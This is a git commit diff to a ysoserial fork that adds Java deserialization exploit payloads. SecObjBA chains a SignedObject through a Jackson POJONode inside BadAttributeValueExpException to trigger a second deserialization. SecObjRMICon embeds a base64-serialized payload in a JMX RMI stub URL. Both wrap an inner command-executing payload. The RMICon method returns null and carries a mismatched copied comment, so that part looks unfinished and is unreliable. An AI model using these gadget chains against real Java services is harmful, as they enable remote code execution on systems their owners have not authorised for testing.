ac2d7124b5a310efdccaf9578cf736ee04ddf525
Jlan45 <z405454586@icloud.com>
2023-07-23 04:32:16 +0800

    增加BadAttr触发toString导致jackson getter二次反序列化

--- src/main/java/ysoserial/payloads/SecObjBA.java
+++ src/main/java/ysoserial/payloads/SecObjBA.java
@@ -1,27 +1,35 @@
 package ysoserial.payloads;
 
+import com.fasterxml.jackson.databind.node.POJONode;
 import com.sun.syndication.feed.impl.ObjectBean;
+import org.apache.commons.codec.binary.Base64;
+import ysoserial.Serializer;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.ParseArg;
 import ysoserial.payloads.util.PayloadRunner;
 
+import javax.management.BadAttributeValueExpException;
+import javax.management.remote.JMXServiceURL;
+import javax.management.remote.rmi.RMIConnector;
 import java.io.Serializable;
 import java.lang.reflect.Method;
 import java.security.KeyPair;
 import java.security.KeyPairGenerator;
 import java.security.Signature;
 import java.security.SignedObject;
+import java.lang.reflect.Field;
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
 
 @SuppressWarnings({"rawtypes", "unchecked", "restriction"})
-@Dependencies("rome:rome:1.0")
+@Dependencies("jackson:jackson")
 @Authors({ Authors.J1an })
-public class SecObjROME extends PayloadRunner implements ObjectPayload<Object> {
+public class SecObjBA extends PayloadRunner implements ObjectPayload<Object> {
 
-	public Object getObject(final String command) throws Exception {
+    public Object getObject(final String command) throws Exception {
         KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
         kpg.initialize(1024);
         KeyPair kp = kpg.generateKeyPair();
@@ -31,12 +39,15 @@ public class SecObjROME extends PayloadRunner implements ObjectPayload<Object> {
         }
         Method getPayloadObj= payloadClazz.getMethod("getObject", String.class);
         SignedObject signedObject = new SignedObject((Serializable) getPayloadObj.invoke(payloadClazz.newInstance(), command.split(":",2)[1]), kp.getPrivate(), Signature.getInstance("DSA"));
-        ObjectBean delegate = new ObjectBean(SignedObject.class, signedObject);
-        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
-        return Gadgets.makeMap(root, root);
+        POJONode node = new POJONode(signedObject);
+        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
+        Field valfield = val.getClass().getDeclaredField("val");
+        valfield.setAccessible(true);
+        valfield.set(val, node);
+        return val;
     }
 
-	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(SecObjROME.class, args);
-	}
+    public static void main(final String[] args) throws Exception {
+        PayloadRunner.run(SecObjBA.class, args);
+    }
 }
--- src/main/java/ysoserial/payloads/SecObjRMICon.java
+++ src/main/java/ysoserial/payloads/SecObjRMICon.java
@@ -1,12 +1,15 @@
 package ysoserial.payloads;
 
 import com.sun.syndication.feed.impl.ObjectBean;
+import org.apache.commons.codec.binary.Base64;
+import ysoserial.Serializer;
 import ysoserial.payloads.annotation.Authors;
-import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.ParseArg;
 import ysoserial.payloads.util.PayloadRunner;
 
+import javax.management.remote.JMXServiceURL;
+import javax.management.remote.rmi.RMIConnector;
 import java.io.Serializable;
 import java.lang.reflect.Method;
 import java.security.KeyPair;
@@ -14,29 +17,32 @@ import java.security.KeyPairGenerator;
 import java.security.Signature;
 import java.security.SignedObject;
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
 
+/*
+ * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
+ * InvokerTransformer.
+ */
 @SuppressWarnings({"rawtypes", "unchecked", "restriction"})
-@Dependencies("rome:rome:1.0")
 @Authors({ Authors.J1an })
-public class SecObjROME extends PayloadRunner implements ObjectPayload<Object> {
+public class SecObjRMICon extends PayloadRunner implements ObjectPayload<Object> {
 
 	public Object getObject(final String command) throws Exception {
-        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
-        kpg.initialize(1024);
-        KeyPair kp = kpg.generateKeyPair();
         Class payloadClazz= ParseArg.getTargetPayload(command);
         if (payloadClazz == null) {
             throw new IllegalArgumentException("Invalid payload type '" + command.split(":")[0] + "'");
         }
         Method getPayloadObj= payloadClazz.getMethod("getObject", String.class);
-        SignedObject signedObject = new SignedObject((Serializable) getPayloadObj.invoke(payloadClazz.newInstance(), command.split(":",2)[1]), kp.getPrivate(), Signature.getInstance("DSA"));
-        ObjectBean delegate = new ObjectBean(SignedObject.class, signedObject);
-        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
-        return Gadgets.makeMap(root, root);
+        byte[] base64Obj=Base64.encodeBase64(Serializer.serialize(getPayloadObj.invoke(payloadClazz.newInstance(), command.split(":",2)[1])));
+        String finalStubBase64URL="service:jmx:rmi:///stub/" + new String(base64Obj);
+        JMXServiceURL jmxServiceURL = new JMXServiceURL(finalStubBase64URL);
+        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL,new HashMap());
+
+        return null;
     }
 
 	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(SecObjROME.class, args);
+		PayloadRunner.run(SecObjRMICon.class, args);
 	}
 }
